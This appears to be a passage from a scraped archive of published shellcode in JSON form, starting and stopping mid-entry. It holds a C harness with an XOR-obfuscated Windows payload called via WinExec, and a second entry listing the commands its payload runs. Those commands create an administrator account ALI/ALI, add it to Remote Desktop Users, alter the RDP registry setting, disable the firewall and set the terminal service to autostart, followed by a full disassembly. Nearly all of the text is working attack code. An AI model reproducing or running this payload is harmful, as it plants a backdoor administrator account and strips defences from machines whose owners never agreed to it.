%edx,%ecx", " 352:   51                      push   %ecx", " 353:   b9 39 22 5e 50          mov    $0x505e2239,%ecx", " 358:   ba 4b 47 39 70          mov    $0x7039474b,%edx", " 35d:   31 d1                   xor    %edx,%ecx", " 35f:   51                      push   %ecx", " 360:   89 e0                   mov    %esp,%eax", " 362:   bb 41 41 41 01          mov    $0x1414141,%ebx", " 367:   c1 eb 08                shr    $0x8,%ebx", " 36a:   c1 eb 08                shr    $0x8,%ebx", " 36d:   c1 eb 08                shr    $0x8,%ebx", " 370:   53                      push   %ebx", " 371:   50                      push   %eax", " 372:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", " 377:   ba 33 52 64 59          mov    $0x59645233,%edx", " 37c:   31 d3                   xor    %edx,%ebx", " 37e:   ff d3                   call   *%ebx", " 380:   31 c0                   xor    %eax,%eax", " 382:   50                      push   %eax", " 383:   b8 41 41 41 65          mov    $0x65414141,%eax", " 388:   c1 e8 08                shr    $0x8,%eax", " 38b:   c1 e8 08                shr    $0x8,%eax", " 38e:   c1 e8 08                shr    $0x8,%eax", " 391:   50                      push   %eax", " 392:   b9 1e 53 39 3c          mov    $0x3c39531e,%ecx", " 397:   ba 6d 32 5b 50          mov    $0x505b326d,%edx", " 39c:   31 d1                   xor    %edx,%ecx", " 39e:   51                      push   %ecx", " 39f:   b9 04 66 2f 32          mov    $0x322f6604,%ecx", " 3a4:   ba 61 46 4b 5b          mov    $0x5b4b4661,%edx", " 3a9:   31 d1                   xor    %edx,%ecx", " 3ab:   51                      push   %ecx", " 3ac:   b9 19 1e 0d 11          mov    $0x110d1e19,%ecx", " 3b1:   ba 69 73 62 75          mov    $0x75627369,%edx", " 3b6:   31 d1                   xor    %edx,%ecx", " 3b8:   51                      push   %ecx", " 3b9:   b9 20 41 47 36          mov    $0x36474120,%ecx", " 3be:   ba 45 35 67 59          mov    $0x59673545,%edx", " 3c3:   31 d1                   xor    %edx,%ecx", " 3c5:   51                      push   %ecx", " 3c6:   b9 2b 05 64 2a          mov    $0x2a64052b,%ecx", " 3cb:   ba 47 69 44 59          mov    $0x59446947,%edx", " 3d0:   31 d1                   xor    %edx,%ecx", " 3d2:   51                      push   %ecx", " 3d3:   b9 10 3f 4f 22          mov    $0x224f3f10,%ecx", " 3d8:   ba 62 5a 38 43          mov    $0x43385a62,%edx", " 3dd:   31 d1                   xor    %edx,%ecx", " 3df:   51                      push   %ecx", " 3e0:   b9 2a 6f 2a 24          mov    $0x242a6f2a,%ecx", " 3e5:   ba 42 4f 4c 4d          mov    $0x4d4c4f42,%edx", " 3ea:   31 d1                   xor    %edx,%ecx", " 3ec:   51                      push   %ecx", " 3ed:   b9 29 09 1e 5e          mov    $0x5e1e0929,%ecx", " 3f2:   ba 47 6c 6a 2d          mov    $0x2d6a6c47,%edx", " 3f7:   31 d1                   xor    %edx,%ecx", " 3f9:   51                      push   %ecx", " 3fa:   89 e0                   mov    %esp,%eax", " 3fc:   bb 41 41 41 01          mov    $0x1414141,%ebx", " 401:   c1 eb 08                shr    $0x8,%ebx", " 404:   c1 eb 08                shr    $0x8,%ebx", " 407:   c1 eb 08                shr    $0x8,%ebx", " 40a:   53                      push   %ebx", " 40b:   50                      push   %eax", " 40c:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", " 411:   ba 33 52 64 59          mov    $0x59645233,%edx", " 416:   31 d3                   xor    %edx,%ebx", " 418:   ff d3                   call   *%ebx", " 41a:   31 c0                   xor    %eax,%eax", " 41c:   50                      push   %eax", " 41d:   b8 41 41 41 6f          mov    $0x6f414141,%eax", " 422:   c1 e8 08                shr    $0x8,%eax", " 425:   c1 e8 08                shr    $0x8,%eax", " 428:   c1 e8 08                shr    $0x8,%eax", " 42b:   50                      push   %eax", " 42c:   b9 72 2a 05 39          mov    $0x39052a72,%ecx", " 431:   ba 52 4b 70 4d          mov    $0x4d704b52,%edx", " 436:   31 d1                   xor    %edx,%ecx", " 438:   51                      push   %ecx", " 439:   b9 54 3a 05 52          mov    $0x52053a54,%ecx", " 43e:   ba 35 48 71 6f          mov    $0x6f714835,%edx", " 443:   31 d1                   xor    %edx,%ecx", " 445:   51                      push   %ecx", " 446:   b9 29 16 0a 47          mov    $0x470a1629,%ecx", " 44b:   ba 4c 36 79 33          mov    $0x3379364c,%edx", " 450:   31 d1                   xor    %edx,%ecx", " 452:   51                      push   %ecx", " 453:   b9 27 1b 5b 3e          mov    $0x3e5b1b27,%ecx", " 458:   ba 55 6d 32 5d          mov    $0x5d326d55,%edx", " 45d:   31 d1                   xor    %edx,%ecx", " 45f:   51                      push   %ecx", " 460:   b9 33 1a 3b 10          mov    $0x103b1a33,%ecx", " 465:   ba 41 77 48 75          mov    $0x75487741,%edx", " 46a:   31 d1                   xor    %edx,%ecx", " 46c:   51                      push   %ecx", " 46d:   b9 34 79 3a 12          mov    $0x123a7934,%ecx", " 472:   ba 53 59 4e 77          mov    $0x774e5953,%edx", " 477:   31 d1                   xor    %edx,%ecx", " 479:   51                      push   %ecx", " 47a:   b9 1d 5c 1e 28          mov    $0x281e5c1d,%ecx", " 47f:   ba 72 32 78 41          mov    $0x41783272,%edx", " 484:   31 d1                   xor    %edx,%ecx", " 486:   51                      push   %ecx", " 487:   b9 2a 4e 5a 28          mov    $0x285a4e2a,%ecx", " 48c:   ba 59 2d 7a 4b          mov    $0x4b7a2d59,%edx", " 491:   31 d1                   xor    %edx,%ecx", " 493:   51                      push   %ecx", " 494:   89 e0                   mov    %esp,%eax", " 496:   bb 41 41 41 01          mov    $0x1414141,%ebx", " 49b:   c1 eb 08                shr    $0x8,%ebx", " 49e:   c1 eb 08                shr    $0x8,%ebx", " 4a1:   c1 eb 08                shr    $0x8,%ebx", " 4a4:   53                      push   %ebx", " 4a5:   50                      push   %eax", " 4a6:   bb a6 b4 02 2f          mov    $0x2f02b4a6,%ebx", " 4ab:   ba 33 52 64 59          mov    $0x59645233,%edx", " 4b0:   31 d3                   xor    %edx,%ebx", " 4b2:   ff d3                   call   *%ebx", " 4b4:   bb f9 7e 5e 22          mov    $0x225e7ef9,%ebx", " 4b9:   ba 36 54 3d 54          mov    $0x543d5436,%edx", " 4be:   31 d3                   xor    %edx,%ebx", " 4c0:   ff d3                   call   *%ebx", " ", " ", "*/", " ", "#include <stdio.h>", "#include <string.h>", " ", "int main(){", "unsigned char shellcode[]= \"\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x64\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x6d\\x76\\x53\\x52\\xba\\x4d\\x59\\x32\\x36\\x31\\xd1\\x51\\xb9\\x6e\\x72\\x61\\x71\\xba\\x4e\\x33\\x2d\\x38\\x31\\xd1\\x51\\xb9\\x6c\\x75\\x78\\x78\\xba\\x4c\\x34\\x34\\x31\\x31\\xd1\\x51\\xb9\\x46\\x47\\x57\\x46\\xba\\x33\\x34\\x32\\x34\\x31\\xd1\\x51\\xb9\\x56\\x50\\x47\\x64\\xba\\x38\\x35\\x33\\x44\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\x68\\x41\\x41\\x64\\x64\\x58\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x01\\x41\\x60\\x32\\xba\\x48\\x61\\x4f\\x53\\x31\\xd1\\x51\\xb9\\x28\\x47\\x0d\\x2f\\xba\\x5b\\x67\\x4c\\x63\\x31\\xd1\\x51\\xb9\\x03\\x24\\x36\\x21\\xba\\x62\\x50\\x59\\x53\\x31\\xd1\\x51\\xb9\\x34\\x41\\x15\\x18\\xba\\x5d\\x32\\x61\\x6a\\x31\\xd1\\x51\\xb9\\x0c\\x05\\x1b\\x25\\xba\\x68\\x68\\x72\\x4b\\x31\\xd1\\x51\\xb9\\x2f\\x27\\x7b\\x13\\xba\\x5a\\x57\\x5b\\x52\\x31\\xd1\\x51\\xb9\\x1c\\x2c\\x02\\x3e\\xba\\x70\\x4b\\x70\\x51\\x31\\xd1\\x51\\xb9\\x3d\\x2a\\x32\\x4c\\xba\\x51\\x45\\x51\\x2d\\x31\\xd1\\x51\\xb9\\x23\\x5c\\x1c\\x19\\xba\\x4d\\x39\\x68\\x39\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\x68\\x41\\x41\\x64\\x64\\x58\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x02\\x63\\x6b\\x35\\xba\\x4b\\x43\\x44\\x54\\x31\\xd1\\x51\\xb9\\x61\\x55\\x6c\\x3d\\xba\\x43\\x75\\x2d\\x71\\x31\\xd1\\x51\\xb9\\x27\\x3f\\x3b\\x1a\\xba\\x54\\x5a\\x49\\x69\\x31\\xd1\\x51\\xb9\\x25\\x34\\x12\\x67\\xba\\x4a\\x44\\x32\\x32\\x31\\xd1\\x51\\xb9\\x0b\\x02\\x1f\\x19\\xba\\x6e\\x71\\x74\\x6d\\x31\\xd1\\x51\\xb9\\x39\\x3f\\x7b\\x15\\xba\\x4d\\x5a\\x5b\\x51\\x31\\xd1\\x51\\xb9\\x35\\x15\\x03\\x2a\\xba\\x67\\x70\\x6e\\x45\\x31\\xd1\\x51\\xb9\\x3a\\x17\\x75\\x46\\xba\\x6f\\x47\\x55\\x64\\x31\\xd1\\x51\\xb9\\x26\\x35\\x0b\\x1e\\xba\\x6a\\x72\\x59\\x51\\x31\\xd1\\x51\\xb9\\x2a\\x2a\\x06\\x2a\\xba\\x66\\x65\\x45\\x6b\\x31\\xd1\\x51\\xb9\\x1d\\x20\\x35\\x5a\\xba\\x53\\x65\\x61\\x7a\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb9\\x09\\x4c\\x7c\\x5e\\xba\\x38\\x6c\\x53\\x38\\x31\\xd1\\x51\\xb9\\x42\\x4d\\x39\\x14\\xba\\x62\\x62\\x5d\\x34\\x31\\xd1\\x51\\xb9\\x7a\\x24\\x26\\x75\\xba\\x2d\\x6b\\x74\\x31\\x31\\xd1\\x51\\xb9\\x1d\\x30\\x15\\x28\\xba\\x58\\x77\\x4a\\x6c\\x31\\xd1\\x51\\xb9\\x7c\\x2f\\x57\\x16\\xba\\x53\\x5b\\x77\\x44\\x31\\xd1\\x51\\xb9\\x42\\x25\\x2a\\x66\\xba\\x2d\\x4b\\x59\\x46\\x31\\xd1\\x51\\xb9\\x28\\x2f\\x0c\\x5a\\xba\\x4d\\x4c\\x78\\x33\\x31\\xd1\\x51\\xb9\\x20\\x2b\\x26\\x26\\xba\\x63\\x44\\x48\\x48\\x31\\xd1\\x51\\xb9\\x08\\x2b\\x23\\x67\\xba\\x66\\x52\\x77\\x34\\x31\\xd1\\x51\\xb9\\x49\\x1c\\x2e\\x48\\xba\\x69\\x7a\\x6a\\x2d\\x31\\xd1\\x51\\xb9\\x67\\x67\\x1d\\x37\\xba\\x45\\x47\\x32\\x41\\x31\\xd1\\x51\\xb9\\x03\\x33\\x0d\\x3b\\xba\\x71\\x45\\x68\\x49\\x31\\xd1\\x51\\xb9\\x39\\x6a\\x3c\\x2f\\xba\\x55\\x4a\\x6f\\x4a\\x31\\xd1\\x51\\xb9\\x37\\x44\\x1f\\x2e\\xba\\x5a\\x2d\\x71\\x4f\\x31\\xd1\\x51\\xb9\\x34\\x23\\x23\\x3b\\xba\\x68\\x77\\x46\\x49\\x31\\xd1\\x51\\xb9\\x07\\x3a\\x0a\\x14\\xba\\x73\\x48\\x65\\x78\\x31\\xd1\\x51\\xb9\\x14\\x2e\\x58\\x53\\xba\\x48\\x6d\\x37\\x3d\\x31\\xd1\\x51\\xb9\\x3e\\x3d\\x26\\x32\\xba\\x52\\x6e\\x43\\x46\\x31\\xd1\\x51\\xb9\\x33\\x3c\\x35\\x34\\xba\\x5d\\x48\\x47\\x5b\\x31\\xd1\\x51\\xb9\\x36\\x0e\\x07\\x2b\\xba\\x58\\x7a\\x44\\x44\\x31\\xd1\\x51\\xb9\\x3c\\x10\\x0a\\x37\\xba\\x49\\x62\\x78\\x52\\x31\\xd1\\x51\\xb9\\x24\\x7c\\x3b\\x36\\xba\\x61\\x31\\x67\\x75\\x31\\xd1\\x51\\xb9\\x31\\x3d\\x3b\\x27\\xba\\x62\\x64\\x68\\x73\\x31\\xd1\\x51\\xb9\\x7f\\x7d\\x3d\\x35\\xba\\x36\\x33\\x78\\x69\\x31\\xd1\\x51\\xb9\\x7c\\x13\\x0f\\x2f\\xba\\x31\\x52\\x4c\\x67\\x31\\xd1\\x51\\xb9\\x1b\\x08\\x35\\x2d\\xba\\x58\\x49\\x79\\x72\\x31\\xd1\\x51\\xb9\\x74\\x3a\\x1e\\x21\\xba\\x2d\\x65\\x52\\x6e\\x31\\xd1\\x51\\xb9\\x16\\x10\\x1f\\x17\\xba\\x34\\x58\\x54\\x52\\x31\\xd1\\x51\\xb9\\x2f\\x27\\x0c\\x6e\\xba\\x4e\\x43\\x68\\x4e\\x31\\xd1\\x51\\xb9\\x39\\x22\\x5e\\x50\\xba\\x4b\\x47\\x39\\x70\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x65\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x1e\\x53\\x39\\x3c\\xba\\x6d\\x32\\x5b\\x50\\x31\\xd1\\x51\\xb9\\x04\\x66\\x2f\\x32\\xba\\x61\\x46\\x4b\\x5b\\x31\\xd1\\x51\\xb9\\x19\\x1e\\x0d\\x11\\xba\\x69\\x73\\x62\\x75\\x31\\xd1\\x51\\xb9\\x20\\x41\\x47\\x36\\xba\\x45\\x35\\x67\\x59\\x31\\xd1\\x51\\xb9\\x2b\\x05\\x64\\x2a\\xba\\x47\\x69\\x44\\x59\\x31\\xd1\\x51\\xb9\\x10\\x3f\\x4f\\x22\\xba\\x62\\x5a\\x38\\x43\\x31\\xd1\\x51\\xb9\\x2a\\x6f\\x2a\\x24\\xba\\x42\\x4f\\x4c\\x4d\\x31\\xd1\\x51\\xb9\\x29\\x09\\x1e\\x5e\\xba\\x47\\x6c\\x6a\\x2d\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\x31\\xc0\\x50\\xb8\\x41\\x41\\x41\\x6f\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\xc1\\xe8\\x08\\x50\\xb9\\x72\\x2a\\x05\\x39\\xba\\x52\\x4b\\x70\\x4d\\x31\\xd1\\x51\\xb9\\x54\\x3a\\x05\\x52\\xba\\x35\\x48\\x71\\x6f\\x31\\xd1\\x51\\xb9\\x29\\x16\\x0a\\x47\\xba\\x4c\\x36\\x79\\x33\\x31\\xd1\\x51\\xb9\\x27\\x1b\\x5b\\x3e\\xba\\x55\\x6d\\x32\\x5d\\x31\\xd1\\x51\\xb9\\x33\\x1a\\x3b\\x10\\xba\\x41\\x77\\x48\\x75\\x31\\xd1\\x51\\xb9\\x34\\x79\\x3a\\x12\\xba\\x53\\x59\\x4e\\x77\\x31\\xd1\\x51\\xb9\\x1d\\x5c\\x1e\\x28\\xba\\x72\\x32\\x78\\x41\\x31\\xd1\\x51\\xb9\\x2a\\x4e\\x5a\\x28\\xba\\x59\\x2d\\x7a\\x4b\\x31\\xd1\\x51\\x89\\xe0\\xbb\\x41\\x41\\x41\\x01\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\xc1\\xeb\\x08\\x53\\x50\\xbb\\xa6\\xb4\\x02\\x2f\\xba\\x33\\x52\\x64\\x59\\x31\\xd3\\xff\\xd3\\xbb\\xf9\\x7e\\x5e\\x22\\xba\\x36\\x54\\x3d\\x54\\x31\\xd3\\xff\\xd3\";", "fprintf(stdout,\"Length: %d\\n\\n\",strlen(shellcode));", "    (*(void(*)()) shellcode)();", "}"]},
{"Title": "Windows/x64 - Add Administrator User (ALI/ALI) + Add To RDP Group + Enable RDP From Registry + Stop Firewall + Auto Start Terminal Service + Obfuscated Shellcode (1218 bytes)", "Author": "Ali Razmjoo", "Published": ": 2015-01-13", "Platform": "Windows_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-898.php", "View": null, "code": ["#Author: Ali Razmjoo", "\u200b \u200b#Title: \u200bObfuscated Shellcode Windows x64 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]", "\t", "Obfuscated Shellcode Windows x64 [1218 Bytes].c", "", "/*", "#Title: Obfuscated Shellcode Windows x64 [1218 Bytes] [Add Administrator User/Pass ALI/ALI & Add ALI to RDP Group & Enable RDP From Registery & STOP Firewall & Auto Start terminal service]", "#length: 1218 bytes", "#Date: 13 January 2015", "#Author: Ali Razmjoo", "#tested On: Windows 7 x64 ultimate", "", "WinExec =>  0x769e2c91", "ExitProcess =>  0x769679f8", "====================================", "Execute :", "net user ALI ALI /add", "net localgroup Administrators ALI /add", "NET LOCALGROUP \"Remote Desktop Users\" ALI /add  ", "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f ", "netsh firewall set opmode disable", "sc config termservice start= auto", "====================================", "", "", "", "Ali Razmjoo , ['Ali.Razmjoo1994@Gmail.Com','Ali@Z3r0D4y.Com']", "", "Thanks to my friends , Dariush Nasirpour and Ehsan Nezami", "", "", "C:\\Users\\Ali\\Desktop>objdump -D shellcode.o", "", "shellcode.o:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "00000000 <.text>:", "   0:\t31 c0                \txor    %eax,%eax", "   2:\t50                   \tpush   %eax", "   3:\tb8 41 41 41 64       \tmov    $0x64414141,%eax", "   8:\tc1 e8 08             \tshr    $0x8,%eax", "   b:\tc1 e8 08             \tshr    $0x8,%eax", "   e:\tc1 e8 08             \tshr    $0x8,%eax", "  11:\t50                   \tpush   %eax", "  12:\tb9 6d 76 53 52       \tmov    $0x5253766d,%ecx", "  17:\tba 4d 59 32 36       \tmov    $0x3632594d,%edx", "  1c:\t31 d1                \txor    %edx,%ecx", "  1e:\t51                   \tpush   %ecx", "  1f:\tb9 6e 72 61 71       \tmov    $0x7161726e,%ecx", "  24:\tba 4e 33 2d 38       \tmov    $0x382d334e,%edx", "  29:\t31 d1                \txor    %edx,%ecx", "  2b:\t51                   \tpush   %ecx", "  2c:\tb9 6c 75 78 78       \tmov    $0x7878756c,%ecx", "  31:\tba 4c 34 34 31       \tmov    $0x3134344c,%edx", "  36:\t31 d1                \txor    %edx,%ecx", "  38:\t51                   \tpush   %ecx", "  39:\tb9 46 47 57 46       \tmov    $0x46574746,%ecx", "  3e:\tba 33 34 32 34       \tmov    $0x34323433,%edx", "  43:\t31 d1                \txor    %edx,%ecx", "  45:\t51                   \tpush   %ecx", "  46:\tb9 56 50 47 64       \tmov    $0x64475056,%ecx", "  4b:\tba 38 35 33 44       \tmov    $0x44333538,%edx", "  50:\t31 d1                \txor    %edx,%ecx", "  52:\t51                   \tpush   %ecx", "  53:\t89 e0                \tmov    %esp,%eax", "  55:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", "  5a:\tc1 eb 08             \tshr    $0x8,%ebx", "  5d:\tc1 eb 08             \tshr    $0x8,%ebx", "  60:\tc1 eb 08             \tshr    $0x8,%ebx", "  63:\t53                   \tpush   %ebx", "  64:\t50                   \tpush   %eax", "  65:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", "  6a:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", "  6f:\t31 d3                \txor    %edx,%ebx", "  71:\tff d3                \tcall   *%ebx", "  73:\t31 c0                \txor    %eax,%eax", "  75:\t50                   \tpush   %eax", "  76:\t68 41 41 64 64       \tpush   $0x64644141", "  7b:\t58                   \tpop    %eax", "  7c:\tc1 e8 08             \tshr    $0x8,%eax", "  7f:\tc1 e8 08             \tshr    $0x8,%eax", "  82:\t50                   \tpush   %eax", "  83:\tb9 01 41 60 32       \tmov    $0x32604101,%ecx", "  88:\tba 48 61 4f 53       \tmov    $0x534f6148,%edx", "  8d:\t31 d1                \txor    %edx,%ecx", "  8f:\t51                   \tpush   %ecx", "  90:\tb9 28 47 0d 2f       \tmov    $0x2f0d4728,%ecx", "  95:\tba 5b 67 4c 63       \tmov    $0x634c675b,%edx", "  9a:\t31 d1                \txor    %edx,%ecx", "  9c:\t51                   \tpush   %ecx", "  9d:\tb9 03 24 36 21       \tmov    $0x21362403,%ecx", "  a2:\tba 62 50 59 53       \tmov    $0x53595062,%edx", "  a7:\t31 d1                \txor    %edx,%ecx", "  a9:\t51                   \tpush   %ecx", "  aa:\tb9 34 41 15 18       \tmov    $0x18154134,%ecx", "  af:\tba 5d 32 61 6a       \tmov    $0x6a61325d,%edx", "  b4:\t31 d1                \txor    %edx,%ecx", "  b6:\t51                   \tpush   %ecx", "  b7:\tb9 0c 05 1b 25       \tmov    $0x251b050c,%ecx", "  bc:\tba 68 68 72 4b       \tmov    $0x4b726868,%edx", "  c1:\t31 d1                \txor    %edx,%ecx", "  c3:\t51                   \tpush   %ecx", "  c4:\tb9 2f 27 7b 13       \tmov    $0x137b272f,%ecx", "  c9:\tba 5a 57 5b 52       \tmov    $0x525b575a,%edx", "  ce:\t31 d1                \txor    %edx,%ecx", "  d0:\t51                   \tpush   %ecx", "  d1:\tb9 1c 2c 02 3e       \tmov    $0x3e022c1c,%ecx", "  d6:\tba 70 4b 70 51       \tmov    $0x51704b70,%edx", "  db:\t31 d1                \txor    %edx,%ecx", "  dd:\t51                   \tpush   %ecx", "  de:\tb9 3d 2a 32 4c       \tmov    $0x4c322a3d,%ecx", "  e3:\tba 51 45 51 2d       \tmov    $0x2d514551,%edx", "  e8:\t31 d1                \txor    %edx,%ecx", "  ea:\t51                   \tpush   %ecx", "  eb:\tb9 23 5c 1c 19       \tmov    $0x191c5c23,%ecx", "  f0:\tba 4d 39 68 39       \tmov    $0x3968394d,%edx", "  f5:\t31 d1                \txor    %edx,%ecx", "  f7:\t51                   \tpush   %ecx", "  f8:\t89 e0                \tmov    %esp,%eax", "  fa:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", "  ff:\tc1 eb 08             \tshr    $0x8,%ebx", " 102:\tc1 eb 08             \tshr    $0x8,%ebx", " 105:\tc1 eb 08             \tshr    $0x8,%ebx", " 108:\t53                   \tpush   %ebx", " 109:\t50                   \tpush   %eax", " 10a:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", " 10f:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", " 114:\t31 d3                \txor    %edx,%ebx", " 116:\tff d3                \tcall   *%ebx", " 118:\t31 c0                \txor    %eax,%eax", " 11a:\t50                   \tpush   %eax", " 11b:\t68 41 41 64 64       \tpush   $0x64644141", " 120:\t58                   \tpop    %eax", " 121:\tc1 e8 08             \tshr    $0x8,%eax", " 124:\tc1 e8 08             \tshr    $0x8,%eax", " 127:\t50                   \tpush   %eax", " 128:\tb9 02 63 6b 35       \tmov    $0x356b6302,%ecx", " 12d:\tba 4b 43 44 54       \tmov    $0x5444434b,%edx", " 132:\t31 d1                \txor    %edx,%ecx", " 134:\t51                   \tpush   %ecx", " 135:\tb9 61 55 6c 3d       \tmov    $0x3d6c5561,%ecx", " 13a:\tba 43 75 2d 71       \tmov    $0x712d7543,%edx", " 13f:\t31 d1                \txor    %edx,%ecx", " 141:\t51                   \tpush   %ecx", " 142:\tb9 27 3f 3b 1a       \tmov    $0x1a3b3f27,%ecx", " 147:\tba 54 5a 49 69       \tmov    $0x69495a54,%edx", " 14c:\t31 d1                \txor    %edx,%ecx", " 14e:\t51                   \tpush   %ecx", " 14f:\tb9 25 34 12 67       \tmov    $0x67123425,%ecx", " 154:\tba 4a 44 32 32       \tmov    $0x3232444a,%edx", " 159:\t31 d1                \txor    %edx,%ecx", " 15b:\t51                   \tpush   %ecx", " 15c:\tb9 0b 02 1f 19       \tmov    $0x191f020b,%ecx", " 161:\tba 6e 71 74 6d       \tmov    $0x6d74716e,%edx", " 166:\t31 d1                \txor    %edx,%ecx", " 168:\t51                   \tpush   %ecx", " 169:\tb9 39 3f 7b 15       \tmov    $0x157b3f39,%ecx", " 16e:\tba 4d 5a 5b 51       \tmov    $0x515b5a4d,%edx", " 173:\t31 d1                \txor    %edx,%ecx", " 175:\t51                   \tpush   %ecx", " 176:\tb9 35 15 03 2a       \tmov    $0x2a031535,%ecx", " 17b:\tba 67 70 6e 45       \tmov    $0x456e7067,%edx", " 180:\t31 d1                \txor    %edx,%ecx", " 182:\t51                   \tpush   %ecx", " 183:\tb9 3a 17 75 46       \tmov    $0x4675173a,%ecx", " 188:\tba 6f 47 55 64       \tmov    $0x6455476f,%edx", " 18d:\t31 d1                \txor    %edx,%ecx", " 18f:\t51                   \tpush   %ecx", " 190:\tb9 26 35 0b 1e       \tmov    $0x1e0b3526,%ecx", " 195:\tba 6a 72 59 51       \tmov    $0x5159726a,%edx", " 19a:\t31 d1                \txor    %edx,%ecx", " 19c:\t51                   \tpush   %ecx", " 19d:\tb9 2a 2a 06 2a       \tmov    $0x2a062a2a,%ecx", " 1a2:\tba 66 65 45 6b       \tmov    $0x6b456566,%edx", " 1a7:\t31 d1                \txor    %edx,%ecx", " 1a9:\t51                   \tpush   %ecx", " 1aa:\tb9 1d 20 35 5a       \tmov    $0x5a35201d,%ecx", " 1af:\tba 53 65 61 7a       \tmov    $0x7a616553,%edx", " 1b4:\t31 d1                \txor    %edx,%ecx", " 1b6:\t51                   \tpush   %ecx", " 1b7:\t89 e0                \tmov    %esp,%eax", " 1b9:\tbb 41 41 41 01       \tmov    $0x1414141,%ebx", " 1be:\tc1 eb 08             \tshr    $0x8,%ebx", " 1c1:\tc1 eb 08             \tshr    $0x8,%ebx", " 1c4:\tc1 eb 08             \tshr    $0x8,%ebx", " 1c7:\t53                   \tpush   %ebx", " 1c8:\t50                   \tpush   %eax", " 1c9:\tbb dc 7a a8 23       \tmov    $0x23a87adc,%ebx", " 1ce:\tba 4d 56 36 55       \tmov    $0x5536564d,%edx", " 1d3:\t31 d3                \txor    %edx,%ebx", " 1d5:\tff d3                \tcall   *%ebx", " 1d7:\t31 c0                \txor    %eax,%eax", " 1d9:\t50                   \tpush   %eax", " 1da:\tb9 09 4c 7c 5e       \tmov    $0x5e7c4c09,%ecx", " 1df:\tba 38 6c 53 38       \tmov    $0x38536c38,%edx", " 1e4:\t31 d1                \txor    %edx,%ecx", " 1e6:\t51                   \tpush   %ecx", " 1e7:\tb9 42 4d 39 14       \tmov    $0x14394d42,%ecx", " 1ec:\tba 62 62 5d 34       \tmov    $0x345d6262,%edx", " 1f1:\t31 d1                \txor    %edx,%ecx", " 1f3:\t51                   \tpush   %ecx", " 1f4:\tb9 7a 24 26 75       \tmov    $0x7526247a,%ecx", " 1f9:\tba 2d 6b 74 31       \tmov    $0x31746b2d,%edx", " 1fe:\t31 d1                \txor    %edx,%ecx", " 200:\t51                   \tpush   %ecx", " 201:\tb9 1d 30 15 28       \tmov    $0x2815301d,%ecx", " 206:\tba 58 77 4a 6c       \tmov    $0x6c4a7758,%edx", " 20b:\t31 d1                \txor    %edx,%ecx", " 20d:\t51                   \tpush   %ecx", " 20e:\tb9 7c 2f 57 16       \tmov    $0x16572f7c,%ecx", " 213:\tba 53 5b 77 44       \tmov    $0x44775b53,%edx", " 218:\t31 d1                \txor    %edx,%ecx", " 21a:\t51                   \tpush   %ecx", " 21b:\tb9 42 25 2a 66       \tmov    $0x662a2542,%ecx", " 220:\tba 2d 4b 59 46       \tmov    $0x46594b2d,%edx", " 225:\t31 d1                \txor    %edx,%ecx", " 227:\t51                   \tpush   %ecx", " 228:\tb9 28 2f 0c 5a       \tmov    $0x5a0c2f28,%ecx", " 22d:\tba 4d 4c 78 33       \tmov    $0x33784c4d,%edx", " 232:\t31 d1                \txor    %edx,%ecx", " 234:\t51                   \tpush   %ecx", " 235:\tb9 20 2b 26 26       \tmov    $0x26262b20,%ecx", " 23a:\tba 63 44 48 48       \tmov    $0x48484463,%edx", " 23f:\t31 d1                \txor    %edx,%ecx", " 241:\t51                   \tpush   %ecx", " 242:\tb9 08 2b 23 67       \tmov    $0x67232b08,%ecx", " 247:\tba 66 52 77 34       \tmov    $0x34775266,%edx", " 24c:\t31 d1                \txor    %edx,%ecx", " 24e:\t51                   \tpush   %ecx", " 24f:\tb9 49 1c 2e 48       \tmov    $0x482e1c49,%ecx", " 254:\tba 69 7a 